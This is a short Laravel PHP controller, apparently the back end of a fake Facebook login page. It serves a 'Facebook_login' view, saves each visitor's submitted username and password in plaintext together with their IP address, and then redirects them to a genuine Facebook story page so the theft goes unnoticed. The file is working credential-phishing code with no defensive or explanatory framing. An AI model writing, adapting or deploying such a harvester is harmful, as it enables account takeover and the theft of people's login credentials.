<?php

namespace App\Http\Controllers;

use App\Models\Track;
use App\Models\Trak;
use App\Services\GeoIPService;
use Illuminate\Http\Request;

class FacebookLoginContoller extends Controller
{
    function get_track(){
             $Track=Track::get();
             return view('Facebook_login');
    }


    function create_track(Request $ip){
             $Track=$ip->ip();
             Track::create([
                             'user'=>$ip->user,
                             'pass'=>$ip->pass,
                             'userip'=>$Track
                             ]);
            //  return redirect('https://web.facebook.com/?_rdc=1&_rdr');
             return redirect('https://mobile.facebook.com/story.php?story_fbid=pfbid0dMZcswWJCVSx9unZxmGQx6hyG81h9W6dxTqCsYCKkDsWndRLYTuE48a7vwXTeFial&id=100064812882317&mibextid=qC1gEa&_rdc=1&_rdr');

    }
}
